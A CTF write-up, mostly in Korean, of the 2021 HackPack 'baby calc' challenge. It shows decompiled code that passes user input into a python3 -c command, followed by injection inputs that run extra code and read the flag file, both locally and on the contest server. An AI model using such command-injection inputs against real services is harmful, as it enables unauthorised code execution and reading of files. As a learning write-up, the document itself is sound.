---
title: "[2021 HackPack CTF] baby calc writeup"
categories:
  - CTF
author_profile: true
---

**2021 hackpack ctf - baby calc writeup**

- 기본적인 python command injection 형태

---

# `checksec`

```
RELRO           STACK CANARY      NX            PIE             
Full RELRO      Canary found      NX enabled    PIE enabled 
```

---

# `funtion analysis`

```bash
r99bbit@parkmin-dev:~/ctf$ ./chal 
Welcome to CloudAdd! The fastest* adder on the planet, now in cloud!
*this is not a legally binding statement
Variable one: 1
Variable two: 2
3
```

- 입력 받은 두 수를 더해준다.



# `hex-ray`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rbp
  int result; // eax
  __int64 v5; // rdx
  unsigned __int64 v6; // rt1
  char v7[55]; // [rsp+0h] [rbp-178h]
  char v8[55]; // [rsp+40h] [rbp-138h]
  char output_buff[220]; // [rsp+80h] [rbp-F8h]
  unsigned __int64 v10; // [rsp+168h] [rbp-10h]
  __int64 v11; // [rsp+170h] [rbp-8h]

  __asm { endbr64 }
  v11 = v3;
  v10 = __readfsqword(0x28u);
  sub_10F0(_bss_start, 0LL, 2LL, 0LL);
  *(_QWORD *)v7 = 0LL;
  *(_QWORD *)&v7[8] = 0LL;
  *(_QWORD *)&v7[16] = 0LL;
  *(_QWORD *)&v7[24] = 0LL;
  *(_QWORD *)&v7[32] = 0LL;
  *(_QWORD *)&v7[40] = 0LL;
  *(_DWORD *)&v7[48] = 0;
  *(_WORD *)&v7[52] = 0;
  v7[54] = 0;
  *(_QWORD *)v8 = 0LL;
  *(_QWORD *)&v8[8] = 0LL;
  *(_QWORD *)&v8[16] = 0LL;
  *(_QWORD *)&v8[24] = 0LL;
  *(_QWORD *)&v8[32] = 0LL;
  *(_QWORD *)&v8[40] = 0LL;
  *(_DWORD *)&v8[48] = 0;
  *(_WORD *)&v8[52] = 0;
  v8[54] = 0;
  *(_QWORD *)output_buff = 0LL;
  *(_QWORD *)&output_buff[8] = 0LL;
  *(_QWORD *)&output_buff[16] = 0LL;
  *(_QWORD *)&output_buff[24] = 0LL;
  *(_QWORD *)&output_buff[32] = 0LL;
  *(_QWORD *)&output_buff[40] = 0LL;
  *(_QWORD *)&output_buff[48] = 0LL;
  *(_QWORD *)&output_buff[56] = 0LL;
  *(_QWORD *)&output_buff[64] = 0LL;
  *(_QWORD *)&output_buff[72] = 0LL;
  *(_QWORD *)&output_buff[80] = 0LL;
  *(_QWORD *)&output_buff[88] = 0LL;
  *(_QWORD *)&output_buff[96] = 0LL;
  *(_QWORD *)&output_buff[104] = 0LL;
  *(_QWORD *)&output_buff[112] = 0LL;
  *(_QWORD *)&output_buff[120] = 0LL;
  *(_QWORD *)&output_buff[128] = 0LL;
  *(_QWORD *)&output_buff[136] = 0LL;
  *(_QWORD *)&output_buff[144] = 0LL;
  *(_QWORD *)&output_buff[152] = 0LL;
  *(_QWORD *)&output_buff[160] = 0LL;
  *(_QWORD *)&output_buff[168] = 0LL;
  *(_QWORD *)&output_buff[176] = 0LL;
  *(_QWORD *)&output_buff[184] = 0LL;
  *(_QWORD *)&output_buff[192] = 0LL;
  *(_QWORD *)&output_buff[200] = 0LL;
  *(_QWORD *)&output_buff[208] = 0LL;
  *(_DWORD *)&output_buff[216] = 0;
  sub_10B0("Welcome to CloudAdd! The fastest* adder on the planet, now in cloud!\n*this is not a legally binding statement");
  sub_10E0("Variable one: ");
  sub_1100("%55s", v7);
  sub_10E0("Variable two: ");
  sub_1100("%55s", v8);
  sub_1110(output_buff, "python3 -c 'print(%s + %s)'", v7, v8);
  sub_10D0(output_buff);
  result = 0;
  v6 = __readfsqword(0x28u);
  v5 = v6 ^ v10;
  if ( v6 != v10 )
    result = sub_10C0(output_buff, "python3 -c 'print(%s + %s)'", v5);
  return result;
}
```

- 핵심은 마지막 줄인데, 입력 받은 두 수를 `python` 스크립트로 실행한다.
- `untrusted input` 에 대한 제대로 된 검증을 하지 않는다.
- 따라서 해당 로직에 `command injection` 취약점이 있음을 알 수 있다.



# `proof of concept`

```bash
r99bbit@parkmin-dev:~/ctf$ ./chal 
Welcome to CloudAdd! The fastest* adder on the planet, now in cloud!
*this is not a legally binding statement
Variable one: );1
Variable two: 2;print(0xdeadbeef

3735928559
r99bbit@parkmin-dev:~/ctf$
```

- `command injection` 취약점을 증명하기 위한 stdin을 집어 넣어 봤다.
- `print();1+2;print(0xdeadbeef)` 형태로 코드가 실행되어 코드가 보이는 것을 볼 수 있다.



# `exploit`

- *local exploit*

```bash
r99bbit@parkmin-dev:~/ctf$ ./chal 
Welcome to CloudAdd! The fastest* adder on the planet, now in cloud!
*this is not a legally binding statement
Variable one: );1
Variable two: 2;print(open("./flag","r").read()

{fake_flag}

r99bbit@parkmin-dev:~/ctf$
```



- *remote exploit*

```c
r99bbit@parkmin-dev:~/ctf$ nc ctf2021.hackpack.club 11001
Welcome to CloudAdd! The fastest* adder on the planet, now in cloud!
*this is not a legally binding statement
Variable one: );1
Variable two: 2;print(open("./flag","r").read()

flag{cL0uD_5Tr4tEgy}
```

